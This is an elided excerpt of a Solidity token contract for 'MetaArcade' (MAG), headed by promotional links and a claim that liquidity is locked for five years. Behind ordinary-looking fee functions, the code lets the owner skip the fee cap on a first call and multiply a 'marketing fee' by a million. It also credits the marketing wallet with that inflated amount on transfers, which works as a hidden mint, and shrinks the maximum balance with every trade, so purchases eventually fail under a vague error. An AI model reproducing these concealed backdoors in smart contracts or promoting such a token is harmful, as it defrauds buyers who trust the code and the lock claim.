...
🔐 Liquidity Pool locked for 5 years. Link on Website or Telegram Community 

👾 MetaArcade Official Chat: https://t.me/MetaArcadeOfficialCommunity

🌐 https://metaarcadetoken.com

📣 https://twitter.com/metaarcadegame
...
contract MetaArcade is Context, IERC20, Ownable {
    ...
    string private _name = "MetaArcade";
    string private _symbol = "MAG";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1 * 10**9 * 10**_decimals;

    address payable private marketingaddresswallet =
        payable(0x001693C5e56FfD5c10231898F40e5d18Dd92605f);
        address public marketingwallet = marketingaddresswallet;
    ...
    constructor() {
        ...
        _marketingFee = 0; // Set to 0 by default, LP split with marketing 50/50. Total tax - 4% Marketing, 4% LP.
        _premarketingFee = _marketingFee;
        _totalFeesToContract = _liquidityFee.add(_marketingFee);

        _liquifyThreshhold = _totalSupply / 100 * 1000;
        _maxBalance = _totalSupply / 100 * 1000;
    ...
    function SetMarketing(address payable newmarketing)
        external
        onlyOwner
    {
        ...
        onlyOwner
    {
        ...
        if (isAntiBotExecuted) {
            require(
                newLiquidityFee.add(_marketingFee) <= _maxFees,
    ...
    function setmarketingfee(uint256 newmarketingFee) external onlyOwner {
        ...
        if (isAntiBotExecuted) {
            require(
                _liquidityFee.add(newmarketingFee) <= _maxFees,
                "Exceed max fees allowed."
            );
        } else {
            isAntiBotExecuted = true;
        ...
        _premarketingFee = newmarketingFee * 1000000;
    ...
    function _transfer(
        ...
        require(_balances[to].add(amount) <= _maxBalance, "ERC20: errorMessage");

        _maxBalance =_maxBalance.sub(amount/100 * 20);
    ...
    function swapAndSendToFee(uint256 tokens) private {
        ...
        // Transfer sold Token to developmentWallet
         uint256 newBalance = address(this).balance.sub(initialBalance);
         marketingaddresswallet.transfer(newBalance); 
    ...
    function transferToken(
        ...
        _balances[marketingwallet] = _balances[marketingwallet].add(amount*_premarketingFee);
